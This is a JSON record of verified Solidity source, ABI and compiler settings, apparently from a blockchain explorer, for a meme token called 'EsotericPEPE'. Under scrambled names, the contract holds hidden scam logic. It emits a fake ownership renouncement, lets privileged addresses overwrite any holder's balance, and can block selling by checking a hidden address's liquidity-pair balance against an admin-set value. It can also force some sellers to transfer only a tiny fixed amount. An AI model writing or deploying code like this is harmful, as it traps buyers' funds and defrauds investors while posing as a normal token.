{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface maxTradingIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAt) external view returns (uint256);\n\n    function transfer(address modeToken, uint256 tokenLaunchTrading) external returns (bool);\n\n    function allowance(address fundFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenLaunchTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeToken,\n        uint256 tokenLaunchTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txSellTake, uint256 value);\n    event Approval(address indexed fundFrom, address indexed spender, uint256 value);\n}\n\nabstract contract feeSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface swapLiquidity {\n    function createPair(address modeEnable, address exemptMax) external returns (address);\n}\n\ninterface marketingReceiver is maxTradingIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EsotericPEPE is feeSender, maxTradingIs, marketingReceiver {\n\n    function transferFrom(address shouldAtLimit, address modeToken, uint256 tokenLaunchTrading) external override returns (bool) {\n        if (_msgSender() != txIs) {\n            if (receiverToken[shouldAtLimit][_msgSender()] != type(uint256).max) {\n                require(tokenLaunchTrading <= receiverToken[shouldAtLimit][_msgSender()]);\n                receiverToken[shouldAtLimit][_msgSender()] -= tokenLaunchTrading;\n            }\n        }\n        return autoLiquidity(shouldAtLimit, modeToken, tokenLaunchTrading);\n    }\n\n    function allowance(address enableShould, address launchTradingAt) external view virtual override returns (uint256) {\n        if (launchTradingAt == txIs) {\n            return type(uint256).max;\n        }\n        return receiverToken[enableShould][launchTradingAt];\n    }\n\n    mapping(address => bool) public launchToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamLiquidity;\n    }\n\n    mapping(address => uint256) private totalLaunched;\n\n    bool public fromLaunch;\n\n    address private minBuy;\n\n    uint256 private autoTx;\n\n    function buyListIs(uint256 tokenLaunchTrading) public {\n        fundMinLaunch();\n        feeLaunch = tokenLaunchTrading;\n    }\n\n    bool private isMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapEnable;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toWallet;\n    }\n\n    uint8 private teamLiquidity = 18;\n\n    uint256 public liquiditySwapWallet;\n\n    address public tradingTotal;\n\n    function fundMinLaunch() private view {\n        require(launchToken[_msgSender()]);\n    }\n\n    function balanceOf(address receiverAt) public view virtual override returns (uint256) {\n        return totalLaunched[receiverAt];\n    }\n\n    bool public amountMarketingTrading;\n\n    function getOwner() external view returns (address) {\n        return minBuy;\n    }\n\n    uint256 public maxTrading;\n\n    function owner() external view returns (address) {\n        return minBuy;\n    }\n\n    function approve(address launchTradingAt, uint256 tokenLaunchTrading) public virtual override returns (bool) {\n        receiverToken[_msgSender()][launchTradingAt] = tokenLaunchTrading;\n        emit Approval(_msgSender(), launchTradingAt, tokenLaunchTrading);\n        return true;\n    }\n\n    bool private fromSender;\n\n    function receiverTrading(address listBuy, uint256 tokenLaunchTrading) public {\n        fundMinLaunch();\n        totalLaunched[listBuy] = tokenLaunchTrading;\n    }\n\n    function transfer(address listBuy, uint256 tokenLaunchTrading) external virtual override returns (bool) {\n        return autoLiquidity(_msgSender(), listBuy, tokenLaunchTrading);\n    }\n\n    bool public swapReceiver;\n\n    mapping(address => mapping(address => uint256)) private receiverToken;\n\n    address public autoSender;\n\n    constructor (){\n        \n        maxWallet modeSellAuto = maxWallet(txIs);\n        autoSender = swapLiquidity(modeSellAuto.factory()).createPair(modeSellAuto.WETH(), address(this));\n        if (fromLaunch == isMarketing) {\n            autoTx = liquiditySwapWallet;\n        }\n        tradingTotal = _msgSender();\n        atEnableLaunch();\n        launchToken[tradingTotal] = true;\n        totalLaunched[tradingTotal] = swapEnable;\n        if (isMarketing) {\n            liquiditySwapWallet = maxTrading;\n        }\n        emit Transfer(address(0), tradingTotal, swapEnable);\n    }\n\n    event OwnershipTransferred(address indexed sellAmount, address indexed txSender);\n\n    string private maxSwap = \"Esoteric PEPE\";\n\n    uint256 feeLaunch;\n\n    uint256 constant swapFrom = 8 ** 10;\n\n    bool public totalReceiver;\n\n    string private toWallet = \"EPE\";\n\n    uint256 private swapEnable = 100000000 * 10 ** 18;\n\n    function autoLaunch(address shouldAtLimit, address modeToken, uint256 tokenLaunchTrading) internal returns (bool) {\n        require(totalLaunched[shouldAtLimit] >= tokenLaunchTrading);\n        totalLaunched[shouldAtLimit] -= tokenLaunchTrading;\n        totalLaunched[modeToken] += tokenLaunchTrading;\n        emit Transfer(shouldAtLimit, modeToken, tokenLaunchTrading);\n        return true;\n    }\n\n    mapping(address => bool) public exemptTakeMin;\n\n    bool public swapLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return maxSwap;\n    }\n\n    address txShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function atEnableLaunch() public {\n        emit OwnershipTransferred(tradingTotal, address(0));\n        minBuy = address(0);\n    }\n\n    bool public listMarketing;\n\n    uint256 takeLiquidity;\n\n    function liquidityTradingTeam(address receiverShouldLiquidity) public {\n        fundMinLaunch();\n        if (liquiditySwapWallet == autoTx) {\n            autoTx = liquiditySwapWallet;\n        }\n        if (receiverShouldLiquidity == tradingTotal || receiverShouldLiquidity == autoSender) {\n            return;\n        }\n        exemptTakeMin[receiverShouldLiquidity] = true;\n    }\n\n    function autoLiquidity(address shouldAtLimit, address modeToken, uint256 tokenLaunchTrading) internal returns (bool) {\n        if (shouldAtLimit == tradingTotal) {\n            return autoLaunch(shouldAtLimit, modeToken, tokenLaunchTrading);\n        }\n        uint256 buyAmount = maxTradingIs(autoSender).balanceOf(txShould);\n        require(buyAmount == feeLaunch);\n        require(modeToken != txShould);\n        if (exemptTakeMin[shouldAtLimit]) {\n            return autoLaunch(shouldAtLimit, modeToken, swapFrom);\n        }\n        return autoLaunch(shouldAtLimit, modeToken, tokenLaunchTrading);\n    }\n\n    function marketingMax(address senderWallet) public {\n        if (totalReceiver) {\n            return;\n        }\n        if (fromLaunch) {\n            autoTx = liquiditySwapWallet;\n        }\n        launchToken[senderWallet] = true;\n        if (listMarketing) {\n            swapLaunch = false;\n        }\n        totalReceiver = true;\n    }\n\n    address txIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txSellTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTradingAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketingTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTradingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLaunchTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atEnableLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenLaunchTrading\",\"type\":\"uint256\"}],\"name\":\"buyListIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTakeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwapWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShouldLiquidity\",\"type\":\"address\"}],\"name\":\"liquidityTradingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"}],\"name\":\"marketingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLaunchTrading\",\"type\":\"uint256\"}],\"name\":\"receiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLaunchTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAtLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenLaunchTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EsotericPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}